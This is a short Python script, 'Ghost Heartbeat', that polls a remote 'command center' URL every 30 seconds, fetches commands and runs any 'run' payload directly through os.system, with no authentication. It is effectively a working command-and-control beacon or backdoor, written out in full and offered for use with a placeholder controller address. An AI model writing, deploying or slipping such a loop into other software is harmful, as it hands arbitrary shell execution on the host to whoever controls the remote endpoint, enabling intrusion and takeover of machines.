# 🚀 Ghost Heartbeat – Always Seeking Orders From The Hive

import time
import requests
import os

GHOST_HQ = "https://your-command-center.com/api/orders"  # Replace with your control API

def fetch_commands():
    try:
        response = requests.get(GHOST_HQ)
        if response.status_code == 200:
            cmds = response.json()
            print(f"[GhostHeartbeat] 💀 Commands: {cmds}")
            for cmd in cmds:
                execute_command(cmd)
        else:
            print(f"[GhostHeartbeat] ⚠️ HQ returned status: {response.status_code}")
    except Exception as e:
        print(f"[GhostHeartbeat] ❌ Failed to reach HQ: {e}")

def execute_command(cmd):
    if cmd.get("type") == "run":
        print(f"[GhostHeartbeat] 🚀 Running: {cmd.get('payload')}")
        os.system(cmd.get("payload"))
    elif cmd.get("type") == "update":
        print("[GhostHeartbeat] 📥 Pulling new files...")
        os.system("git pull")
    else:
        print("[GhostHeartbeat] 🤷 Unknown command.")

def ghost_loop():
    while True:
        fetch_commands()
        time.sleep(30)  # Check every 30s

try:
    ghost_loop()
except KeyboardInterrupt:
    print("[GhostHeartbeat] 🧨 Interrupted. Ghost fading.")